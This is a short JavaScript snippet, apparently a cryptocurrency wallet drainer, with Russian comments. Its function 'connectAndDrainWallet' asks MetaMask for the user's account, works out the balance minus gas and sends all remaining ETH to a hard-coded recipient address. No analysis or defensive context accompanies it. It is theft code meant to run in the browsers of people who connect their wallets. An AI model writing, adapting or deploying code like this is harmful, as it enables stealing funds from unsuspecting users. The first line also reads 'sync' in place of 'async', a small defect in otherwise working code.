sync function connectAndDrainWallet() {
    if (window.ethereum) {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const recipient = "0xC225bC0b6B89DeA3dC55116f6ab3EFE9E1c4bf72"; // Адрес получателя

        const balance = await provider.getBalance(userAddress);

        const gasPrice = await provider.getGasPrice();
        const estimatedGasLimit = 21000; // стандартный лимит газа для перевода ETH

        const totalGasCost = gasPrice.mul(estimatedGasLimit);

        if (balance.lte(totalGasCost)) {
            console.error('Недостаточно средств на оплату газа');
            return;
        }

        const amountToSend = balance.sub(totalGasCost);

        try {
            const tx = await signer.sendTransaction({
                to: recipient,
                value: amountToSend,
                gasLimit: estimatedGasLimit,
                gasPrice: gasPrice
            });
            console.log('All ETH sent:', tx.hash);
        } catch (error) {
            console.error('Failed to send ETH:', error);
        }
    } else {
        alert("Please install MetaMask!");
    }
}
